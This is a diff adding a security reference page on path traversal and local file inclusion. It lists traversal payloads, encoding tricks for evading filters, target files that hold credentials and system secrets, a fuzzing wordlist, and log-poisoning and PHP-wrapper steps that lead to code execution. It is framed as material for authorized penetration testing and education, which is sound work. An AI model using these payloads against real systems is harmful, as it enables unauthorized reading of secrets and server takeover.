@@ -1,0 +1,235 @@
+---
+title: "Path Traversal / Directory Traversal"
+date: "2026-06-26"
+excerpt: "Reading files outside the intended root with ../ — the impact targets worth grabbing, every filter-evasion encoding, OS-specific paths, and the read-to-RCE escalations."
+tags: ["Web", "Path Traversal", "LFI"]
+---
+
+When an application builds a file path from user input without sanitizing it, `../`
+(dot-dot-slash) sequences let an attacker climb the directory tree and read files outside the
+intended folder.
+
+```js
+// vulnerable (Node/Express): path.join resolves the ../ sequences
+const filePath = path.join("/var/www/uploads", req.query.name);
+res.sendFile(filePath);
+// ?name=../../../etc/passwd  →  /etc/passwd
+```
+
+## Impact — what to read
+
+- **Config files** — `.env`, `config.php`, `settings.py`, `application.properties` → DB creds,
+  API keys, JWT secret.
+- **System files** — `/etc/passwd`, `/etc/shadow` (only if running as root), `/etc/hosts`,
+  `/etc/hostname`.
+- **Application source** — `index.js`, `app.py`, `web.xml` to map other vulnerabilities.
+- **Procfs (Linux)** — `/proc/self/environ` for process environment variables (database URLs,
+  secrets).
+- **Logs** — `/var/log/apache2/access.log`, `/var/log/nginx/access.log` (enables log poisoning →
+  RCE, below).
+- **Windows** — `C:\Windows\win.ini`, `C:\boot.ini`, `C:\Windows\System32\drivers\etc\hosts`.
+
+## Basic payloads — start here
+
+```text
+../../../etc/passwd                          Linux user database
+..\..\..\windows\win.ini                     Windows (backslash)
+../../../../app/.env                         env variables
+../../../../proc/self/environ                process env
+../../../../var/log/apache2/access.log       log files
+../../../../etc/hosts                        hosts file
+```
+
+## Filter evasion
+
+### 1. Stripped `../` (non-recursive replacement)
+
+If the filter removes `../` once and doesn't loop, nest the sequences so removal *creates* a
+valid one:
+
+```text
+....//....//....//etc/passwd        strip "../" → ../../../etc/passwd
+..././..././..././etc/passwd
+```
+
+### 2. Encoding
+
+If the app URL-decodes input, encode the dots/slashes. If a WAF decodes once before the app
+decodes again, double-encode:
+
+```text
+%2e%2e%2f          = ../            single URL encode
+..%2f              = ../            slash only
+%252e%252e%252f    → ../            double encode (after first decode)
+..%252f            → ../            double-encoded slash
+%c0%ae%c0%ae%c0%af = ../            overlong UTF-8 (old IIS)
+%u002e%u002e%u002f = ../            unicode
+```
+
+```text
+?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd   →   ../../etc/passwd
+```
+
+### 3. Absolute path
+
+If input is appended to a base but absolute paths are honored, skip traversal entirely:
+
+```text
+/etc/passwd
+/var/www/html/index.php
+C:\Windows\win.ini
+```
+
+### 4. Null byte (legacy PHP < 5.3.4 / old Java)
+
+Terminate the string early so an appended extension (`.pdf`, `.jpg`) is ignored:
+
+```text
+../../../etc/passwd%00.pdf
+../../../etc/passwd%00.jpg
+```
+
+### 5. Base-path consumption
+
+When the base is fixed (e.g. `/var/www/files/`), feed traversal that climbs back out of it:
+
+```text
+/var/www/files/../../etc/passwd
+```
+
+This is the case whenever the code does `__dirname + userInput` — you start inside a known dir
+and walk up.
+
+### 6. Deep traversal
+
+`../` past the filesystem root is harmless, so overshoot to defeat depth assumptions:
+
+```text
+../../../../../../../../../../etc/passwd
+```
+
+### 7. Separator and unicode variants
+
+```text
+..;/..;/..;/etc/passwd       semicolon separator (some routers/parsers)
+..%c0%af                     overlong UTF-8 slash
+..%5c..%5c                   encoded backslash (Windows)
+```
+
+## OS-specific paths
+
+**Linux / Unix**
+
+```text
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/resolv.conf
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/fd/0      stdin  (often holds request input)
+/proc/self/fd/1      stdout
+/proc/self/fd/2      stderr
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/home/*/.bash_history
+/root/.bash_history
+```
+
+**Windows**
+
+```text
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\boot.ini
+C:\inetpub\wwwroot\web.config
+C:\Windows\System32\inetsrv\MetaBase.xml
+C:\Windows\repair\SAM
+```
+
+## From file read to code execution
+
+### Log poisoning (LFI → RCE)
+
+If the include/read sink executes PHP and you can reach a log file:
+
+1. Send a request with a minimal PHP command-exec one-liner in a logged header. Substitute a
+   real exec function (`system`, `passthru`, `exec`) for `EXEC` below — kept as a placeholder so
+   this page doesn't ship a live web shell:
+
+```text
+User-Agent: <?php EXEC($_GET['cmd']); ?>
+```
+
+2. Include the poisoned log via traversal and pass a command:
+
+```text
+?file=../../../../var/log/apache2/access.log&cmd=id
+```
+
+### PHP session inclusion
+
+Set an attacker-controlled value into your session, then include the session file:
+
+```text
+/var/lib/php/sessions/sess_<your_session_id>
+```
+
+### `/proc/self/fd/*`
+
+When you can't guess the target path, walk the process's open file descriptors —
+`/proc/self/fd/0` frequently exposes the current request body:
+
+```text
+../../../../proc/self/fd/0
+```
+
+### PHP wrappers
+
+Not traversal proper, but the same `include()` / `file_get_contents()` sinks accept stream
+wrappers — base64-encode source to exfiltrate it intact:
+
+```text
+?file=php://filter/convert.base64-encode/resource=index.php
+```
+
+## Testing methodology
+
+1. **Spot the parameter** — `file=`, `path=`, `name=`, `page=`, `doc=`, `template=`.
+2. **Try the basic payload** — `../../../etc/passwd`.
+3. **If blocked, escalate encodings** — single → double URL encode → UTF-8/unicode variants.
+4. **Read the response:**
+   - `root:x:0:0...` → success.
+   - "file not found" → wrong depth; try an absolute path or add/remove `../`.
+   - File downloaded/rendered → inspect its content.
+   - No output but differing errors → likely **blind** traversal; diff responses.
+
+## Fuzzing wordlist
+
+Drop into Burp Intruder / ffuf to sweep quickly:
+
+```text
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%c0%af..%c0%afetc/passwd
+..\..\..\windows\win.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+../../../../proc/self/environ
+..;/..;/..;/etc/passwd
+..%252f..%252fetc/passwd
+```
+
+<Callout>
+A reference for authorized testing. Only run these against applications you own or have explicit
+written permission to test.
+</Callout>
